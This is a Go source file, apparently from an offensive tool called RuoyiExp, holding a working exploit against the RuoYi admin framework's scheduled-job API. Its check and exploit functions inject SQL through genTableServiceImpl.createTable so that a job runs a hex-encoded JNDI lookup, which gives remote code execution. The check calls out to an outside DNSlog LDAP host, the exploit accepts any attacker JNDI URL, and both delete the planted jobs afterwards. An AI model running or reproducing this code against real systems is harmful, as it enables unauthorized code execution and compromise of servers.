package exploit

import (
	"RuoyiExp/utils"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/go-resty/resty/v2"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var (
	jobAdd    = "/monitor/job/add"
	jobList   = "/monitor/job/list"
	jobRemove = "/monitor/job/remove"
	jobRun    = "/monitor/job/run"
)

type Results struct {
	Rows []struct {
		JobId   int    `json:"jobId"`
		JobName string `json:"jobName"`
	} `json:"rows"`
}

func Sql2RceCheck(target string, cookies []*http.Cookie, Timeout int) bool {
	client := resty.New()
	client.SetBaseURL(target)
	client.SetTimeout(time.Duration(Timeout) * time.Second)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetCookies(cookies)
	client.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	client.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")
	taskName1, taskName2 := utils.GenerateRandomMd5(), utils.GenerateRandomMd5()
	data := "createBy=admin&jobName=" + taskName1 + "&jobGroup=DEFAULT&invokeTarget=ryTask.ryParams('ry')&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&remark="
	res, err := client.R().SetBody(data).Post(jobAdd)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	res, err = client.R().SetBody("pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=").Post(jobList)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	JobId1 := getJobId(taskName1, res.Body())
	if JobId1 == "0" {
		return false
	}
	time.Sleep(2 * time.Second)
	res, err = client.R().SetBody("createBy=admin&jobName=" + taskName2 + "&jobGroup=DEFAULT&invokeTarget=genTableServiceImpl.createTable('UPDATE+sys_job+SET+invoke_target+%3D+0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f6e706a7036772e646e736c6f672e636e2729+WHERE+job_id+%3D+" + JobId1 + "%3B')&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&remark=").Post(jobAdd)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	res, err = client.R().SetBody("pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=").Post(jobList)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	JobId2 := getJobId(taskName2, res.Body())
	if JobId2 == "0" {
		return false
	}
	res, err = client.R().SetBody("jobId=" + JobId2).Post(jobRun)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	time.Sleep(2 * time.Second)
	if !strings.Contains(string(res.Body()), "操作成功") {
		return false
	}
	res, err = client.R().SetBody("pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=").Post(jobList)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	if !strings.Contains(string(res.Body()), "javax.naming.InitialContext.lookup('ldap://npjp6w.dnslog.cn')") {
		return false
	}
	client.R().SetBody("ids=" + JobId1).Post(jobRemove)
	client.R().SetBody("ids=" + JobId2).Post(jobRemove)
	return true
}
func Sql2RceExploit(target string, cookies []*http.Cookie, JNDI string, Timeout int) bool {
	client := resty.New()
	client.SetBaseURL(target)
	client.SetTimeout(time.Duration(Timeout) * time.Second)
	client.SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client.SetCookies(cookies)
	client.SetHeader("Content-Type", "application/x-www-form-urlencoded")
	client.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")
	taskName1, taskName2 := utils.GenerateRandomMd5(), utils.GenerateRandomMd5()
	data := "createBy=admin&jobName=" + taskName1 + "&jobGroup=DEFAULT&invokeTarget=ryTask.ryParams('ry')&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&remark="
	res, err := client.R().SetBody(data).Post(jobAdd)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	res, err = client.R().SetBody("pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=").Post(jobList)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	JobId1 := getJobId(taskName1, res.Body())
	if JobId1 == "0" {
		return false
	}
	time.Sleep(2 * time.Second)
	res, err = client.R().SetBody("createBy=admin&jobName=" + taskName2 + "&jobGroup=DEFAULT&invokeTarget=genTableServiceImpl.createTable('UPDATE+sys_job+SET+invoke_target+%3D+" + generatePayload(JNDI) + "+WHERE+job_id+%3D+" + JobId1 + "%3B')&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&remark=").Post(jobAdd)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	res, err = client.R().SetBody("pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=").Post(jobList)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	JobId2 := getJobId(taskName2, res.Body())
	if JobId2 == "0" {
		return false
	}
	res, err = client.R().SetBody("jobId=" + JobId2).Post(jobRun)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	time.Sleep(2 * time.Second)
	if !strings.Contains(string(res.Body()), "操作成功") {
		return false
	}
	res, err = client.R().SetBody("pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=").Post(jobList)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	if !strings.Contains(string(res.Body()), JNDI) {
		return false
	}
	res, err = client.R().SetBody("jobId=" + JobId1).Post(jobRun)
	if err != nil {
		return false
	}
	if res.StatusCode() != http.StatusOK {
		return false
	}
	client.R().SetBody("ids=" + JobId1).Post(jobRemove)
	client.R().SetBody("ids=" + JobId2).Post(jobRemove)
	return true
}
func generatePayload(JNDI string) string {
	data := fmt.Sprintf("javax.naming.InitialContext.lookup('%s')", JNDI)
	temp := []byte(data)
	hexString := hex.EncodeToString(temp)
	return "0x" + hexString
}
func getJobId(taskName string, res []byte) string {
	result := new(Results)
	json.Unmarshal(res, result)
	for _, v := range result.Rows {
		if v.JobName == taskName {
			return strconv.Itoa(v.JobId)
		}
	}
	return "0"
}
